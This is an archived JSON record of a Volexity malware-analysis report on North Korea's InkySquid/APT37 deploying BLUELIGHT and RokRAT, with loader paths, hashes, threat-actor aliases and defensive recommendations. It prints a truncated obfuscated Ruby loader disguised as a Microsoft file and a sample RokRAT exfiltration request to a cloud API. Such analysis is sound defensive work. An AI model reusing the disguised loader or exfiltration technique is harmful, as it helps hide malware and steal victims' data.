{
    "id": "33be9731-6466-483e-b923-4ae5eab4e549",
    "created_at": "2023-01-12T14:58:58.890543Z",
    "updated_at": "2025-03-27T02:16:37.229485Z",
    "deleted_at": null,
    "sha1_hash": "b24df6de5729671ad34c4a1a88ea86239a13e513",
    "title": "2021-08-24 - North Korean BLUELIGHT Special- InkySquid Deploys RokRAT",
    "authors": "",
    "file_creation_date": "2022-05-27T22:16:00Z",
    "file_modification_date": "2022-05-27T22:16:00Z",
    "file_size": 588935,
    "plain_text": "# North Korean BLUELIGHT Special: InkySquid Deploys RokRAT\n\n**[volexity.com/blog/2021/08/24/north-korean-bluelight-special-inkysquid-deploys-rokrat/](https://www.volexity.com/blog/2021/08/24/north-korean-bluelight-special-inkysquid-deploys-rokrat/)**\n\nAugust 24, 2021\n\nby Damien Cash, Josh Grunzweig, Steven Adair, Thomas Lancaster\n\nIn a [recent blog post, Volexity disclosed details on a portion of the operations by a North](https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/)\nKorean threat actor it tracks as InkySquid. This threat actor compromised a news portal to\nuse recently patched browser exploits to deliver a custom malware family known as\nBLUELIGHT.\n\nThis follow-up post describes findings from a recent investigation undertaken by Volexity in\nwhich the BLUELIGHT malware was discovered being delivered to a victim alongside\n[RokRAT (aka](https://malpedia.caad.fkie.fraunhofer.de/details/win.rokrat) [DOGCALL). RokRAT is a backdoor previously attributed to use by](https://attack.mitre.org/software/S0213/)\nScarCruft/APT37, which is also known as InkySquid. It should be noted that Volexity\nidentified some overlap between the findings discussed in this post and this Koreanlanguage article.\n\n## Analysis\n\nVolexity is often asked to analyze systems of users frequently targeted by state-sponsored\nthreat actors based on some tip-off or concern that the systems may be compromised. In this\ncase, it was a system belonging to an individual who is a frequent target of North Korean\n\n\n-----\n\nthreat actors. Prior to contacting Volexity, the user had run four separate, popular antivirus\nprograms in attempts to identify and remove any malware. Despite these actions, the user\nwas still concerned that their machine may have been infected. Despite less-than-ideal\nconditions for the starting analysis state, Volexity was able to identify two separate malware\ninfections on the system, and a likely start date for the infection. However, it was not possible\nto confirm how it became infected, as it had been rebooted multiple times since initial\ninfection and several weeks had passed.\n\nThe first malware discovered was installed using a convoluted loading mechanism, where a\nfull copy of Python 2.7 was installed into the following directory:\n```\n   %USERPROFILE%/Python27(64)\n\n```\nAn encoded blob was then stored in the following location:\n```\n   %PROGRAMDATA%/hiddigi/msihnd\n\n```\nA loading script written in Python was written to the following directory:\n```\n   %LocalAppData%/Microsoft/mdmadc/KBDBGPH1\n\n```\nFollowing this, the attacker configured a Scheduled Task to use the Python binary to run the\nloading script and execute the encoded blob. The script decoded a shellcode stub at the\nhead of the msihnd file, which is responsible for setting up a child process using the name of\na randomly chosen EXE file from the \"C:\\Windows\\System32\" directory. The main malware\nwas then decoded from data stored after the initial shellcode, using a single-byte XOR key of\n0x74. The result of this process was that a version of the BLUELIGHT malware family would\n[be loaded. While the sample of BLUELIGHT analyzed in the previous post used Microsoft](https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/)\nGraph for command and control, this version used a custom Google Web App.\n\nLess than 10 minutes after deploying BLUELIGHT, the attacker installed a second malware\nfamily. The loading mechanism for this family was similar to that used for BLUELIGHT;\nalthough this time, a copy of Ruby was installed at the following path:\n```\n   %LOCALAPPDATA%/Microsoft/Ruby27-x64/\n\n```\nThe attacker dropped two encoded blobs to the following locations:\n```\n   %PROGRAMDATA%/User-Mode Bus Enumerator/1BA76030/Shortcut_674D.info\n   %PROGRAMDATA%/Local Kernel Debugger/18E911AC/WinSDK_4641.info\n\n```\nA loading script, written in Ruby, was saved to the following location and set to run as a\nScheduled Task:\n```\n   %PROGRAMDATA%/Microsoft Basic Display Driver/57D45646/Readme.io.md\n\n```\n\n-----\n\nThe Ruby loading script was made to appear as though it were a real system file, with\ncomments indicating it was part of the operating system. The malicious content is encoded\nwithin a URL string, as shown in the Ruby script below:\n```\n   # 14:21:58 27/02/2004\n   # Copyright (c) Microsoft Corporation. All rights reserved.\n   require 'base64'\n   require 'fiddle/import'\n   # Update Driver: name=Microsoft Basic Display Driver, id=289A1260\n   url7d37 = 'https://update.microsoft.com/driverupdate?\n   id=K0AM3YEMjoQD7kCMxoCM2oCMwATMgwCZhVmcoRHK0NWZqJ2Tlx2Zul2Uy9mR0lWYXpjOyMDbl5mclt\n   alias UrlFilter1462 eval;\n   # UrlFilter: id=74F51EE8\n   UrlFilter1462(Base64.decode64(url7d37[45..-1].reverse));\n\n```\nThe effect of this script is to reverse the content after “id=” in the URL and base64 decode it,\nyielding the real script’s true intent: to decrypt the previously written Shortcut_674D.info file\nusing a simple XOR operation.\n\nAfter the Shortcut_674D.info file is decrypted, it is executed within a new thread. This data\nacts as shellcode that seeks out and decrypts an embedded blob of data using a mix of ROL\nand XOR operations. After decryption, an executable file remains and is then run.\n\nThe resulting executable acts as another loader for yet another embedded file. However, this\nloader uses the hostname of the current system to decrypt the embedded payload.\nTherefore, if it is run on any system other than the one intended, the malware will fail to\nexecute. This trait illustrates that the malware is customized; it was created specifically for\nthe exact victim system on which it was discovered.\n\n[If decryption of the payload is successful, the final payload is an instance of the RokRAT](https://malpedia.caad.fkie.fraunhofer.de/details/win.rokrat)\nmalware family with the following properties:\n\nSHA256 19ee7d139908a889d08508dd4225f2d27958ac2c8b7ff18a97507f7de8ce79bc\n\nSHA1 ff080176ab9e51ace68dbe3a56629168b41fa1fc\n\nMD5 9d2e5f9274b25740131f3b6139e3c3ce\n\nFile Type Win64 EXE\n\n\nCompile\nTime\n\n\n2021:05:25 02:20:44+01:00\n\n\n-----\n\nMuch like BLUELIGHT, this malware family uses cloud services for all communications,\nsupporting PCloud, Yandex, Dropbox, and Box for command and control. The API keys for\nthis communication are embedded within the malware itself. The malware is able to perform\na number of functions, including but not limited to the following:\n\nKeylogging and extraction of clipboard data\nCollection of specific filetypes\nDownload/execute further payloads\n\nExfiltrated data is encrypted using an RSA public key, preventing third parties from\ndecrypting it. An example exfiltration request is below:\n\nPOST /uploadfile?path=/1&filename=202106221534400000.q00&nopartial=1\nHTTP/1.1\nConnection: close\nContent-Type: multipart/form-data;boundary=--wwjaughalvncjwiajs-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.8\nAuthorization: Bearer PpmL7Z9qHXPhLX38[TRUNCATED]kuk7HTet3AWYjwvAhuB\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\nContent-Length: 71795\nHost: api.pcloud.com\n\n----wwjaughalvncjwiajs-Content-Disposition: form-data; name=\"file\"; filename=\"202106221534500000.q00\"\nContent-Type: voice/mp3\n\n[DATA]\n\nMuch like its loader, this copy of RokRAT uses the victim’s hostname for decryption of\nimportant strings; it will fail to execute properly if the correct hostname is not present on the\nmachine on which it is run. Additionally, strings within the malware referenced specific file\npaths that resided on the victim’s system. Presumably these paths were discovered by the\nattacker while running commands using BLUELIGHT, meaning the sample was compiled\n\"live\" following initial reconnaissance on the victim's system.\n\n## Conclusion\n\nRokRAT is a closed-source malware family believed to be used exclusively by the North\nKorean [APT37 threat actor, which Volexity tracks as InkySquid. The threat actor has](https://malpedia.caad.fkie.fraunhofer.de/actor/apt37)\nattracted little public attention in the last year and a half. In this case, Volexity was able to tie\n[the new BLUELIGHT malware family observed in the incident described in the previous post](https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/)\nto APT37 based on the use of RokRAT malware, since they were observed being deployed\nsequentially during the intrusion.\n\n\n-----\n\nBoth the BLUELIGHT malware family and RokRAT use cloud services for command and\ncontrol, making network-based detection more difficult. Additionally, while the installation of\nfull copies of scripting languages such as Ruby and Python is noisy, they are cleverly used to\nobfuscate the actual malware which remains encoded on disk and is only truly visible in\nmemory.\n\nThe infected user attempted to scan their machine with four different antivirus programs prior\nto Volexity’s investigation. None detected the presence of either the RokRAT or BLUELIGHT\nmalware families, showing the effectiveness of these techniques to load these malware\nfamilies to evade detection.\n\nTo prevent similar attacks from being effective against your organization, Volexity\nrecommends the following:\n\nIf enterprise users do not require access to cloud storage resources, consider blocking\nthem as they are difficult to detect from a command-and-control perspective.\nConsider monitoring for and alerting on new scheduled tasks containing unusual\narguments, particularly scripting language-based scheduled tasks.\n\nTo prevent these specific attacks from being successful:\n\n[Use the YARA rules provided here to identify related malware.](https://github.com/volexity/threat-intel/blob/main/2021/2021-08-24%20-%20InkySquid%20Part%202/indicators/yara.yar)\nBlock the Google App domain “636478154616bt8kmnrg1l6oml3ipv7ifc6bck0in18h.apps.googleusercontent.com”.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-24 - North Korean BLUELIGHT Special- InkySquid Deploys RokRAT.pdf"
    ],
    "report_names": [
        "2021-08-24 - North Korean BLUELIGHT Special- InkySquid Deploys RokRAT.pdf"
    ],
    "threat_actors": [
        {
            "id": "bbe36874-34b7-4bfb-b38b-84a00b07042e",
            "created_at": "2022-10-25T15:50:23.375277Z",
            "updated_at": "2025-03-27T02:00:55.457787Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "APT37",
                "InkySquid",
                "ScarCruft",
                "Group123",
                "TEMP.Reaper",
                "Ricochet Chollima"
            ],
            "source_name": "MITRE:APT37",
            "tools": [
                "BLUELIGHT",
                "CORALDECK",
                "KARAE",
                "SLOWDRIFT",
                "ROKRAT",
                "SHUTTERSPEED",
                "POORAIM",
                "HAPPYWORK",
                "Final1stspy",
                "Cobalt Strike",
                "NavRAT",
                "DOGCALL",
                "WINERACK"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "552ff939-52c3-421b-b6c9-749cbc21a794",
            "created_at": "2023-01-06T13:46:38.742547Z",
            "updated_at": "2025-03-27T02:00:02.906537Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "ScarCruft",
                "Venus 121",
                "Moldy Pisces",
                "Group 123",
                "APT 37",
                "Group123",
                "Operation Daybreak",
                "Operation Erebus",
                "Red Eyes",
                "TA-RedAnt",
                "InkySquid",
                "Reaper Group",
                "Ricochet Chollima",
                "ATK4",
                "G0067"
            ],
            "source_name": "MISPGALAXY:APT37",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2025-03-27T02:05:17.415028Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9b02c527-5077-489e-9a80-5d88947fddab",
            "created_at": "2022-10-25T16:07:24.103499Z",
            "updated_at": "2025-03-27T02:02:10.108504Z",
            "deleted_at": null,
            "main_name": "Reaper",
            "aliases": [
                "APT 37",
                "ATK 4",
                "Cerium",
                "Crooked Pisces",
                "Geumseong121",
                "Group 123",
                "ITG10",
                "InkySquid",
                "Moldy Pisces",
                "Opal Sleet",
                "Operation Are You Happy?",
                "Operation Battle Cruiser",
                "Operation Black Banner",
                "Operation Daybreak",
                "Operation Dragon messenger",
                "Operation Erebus",
                "Operation Evil New Year",
                "Operation Evil New Year 2018",
                "Operation Fractured Block",
                "Operation Fractured Statue",
                "Operation FreeMilk",
                "Operation Golden Bird",
                "Operation Golden Time",
                "Operation High Expert",
                "Operation Holiday Wiper",
                "Operation Korean Sword",
                "Operation North Korean Human Right",
                "Operation Onezero",
                "Operation Rocket Man",
                "Operation SHROUDED#SLEEP",
                "Operation STARK#MULE",
                "Operation STIFF#BIZON",
                "Operation Spy Cloud",
                "Operation Star Cruiser",
                "Osmium",
                "Red Eyes",
                "Ricochet Chollima",
                "Ruby Sleet",
                "ScarCruft",
                "TA-RedAnt",
                "TEMP.Reaper",
                "Venus 121"
            ],
            "source_name": "ETDA:Reaper",
            "tools": [
                "Agentemis",
                "BLUELIGHT",
                "Backdoor.APT.POORAIM",
                "CARROTBALL",
                "CARROTBAT",
                "CORALDECK",
                "Cobalt Strike",
                "CobaltStrike",
                "DOGCALL",
                "Erebus",
                "Exploit.APT.RICECURRY",
                "Final1stSpy",
                "Freenki Loader",
                "GELCAPSULE",
                "GOLDBACKDOOR",
                "GreezeBackdoor",
                "HAPPYWORK",
                "JinhoSpy",
                "KARAE",
                "KevDroid",
                "Konni",
                "MILKDROP",
                "N1stAgent",
                "NavRAT",
                "Nokki",
                "Oceansalt",
                "POORAIM",
                "PoohMilk",
                "PoohMilk Loader",
                "RICECURRY",
                "RUHAPPY",
                "RokRAT",
                "SHUTTERSPEED",
                "SLOWDRIFT",
                "SOUNDWAVE",
                "SYSCON",
                "Sanny",
                "ScarCruft",
                "StarCruft",
                "Syscon",
                "VeilShell",
                "WINERACK",
                "ZUMKONG",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535538,
    "ts_updated_at": 1743041797,
    "ts_creation_date": 1653689760,
    "ts_modification_date": 1653689760,
    "files": {
        "pdf": "https://archive.orkl.eu/b24df6de5729671ad34c4a1a88ea86239a13e513.pdf",
        "text": "https://archive.orkl.eu/b24df6de5729671ad34c4a1a88ea86239a13e513.txt",
        "img": "https://archive.orkl.eu/b24df6de5729671ad34c4a1a88ea86239a13e513.jpg"
    }
}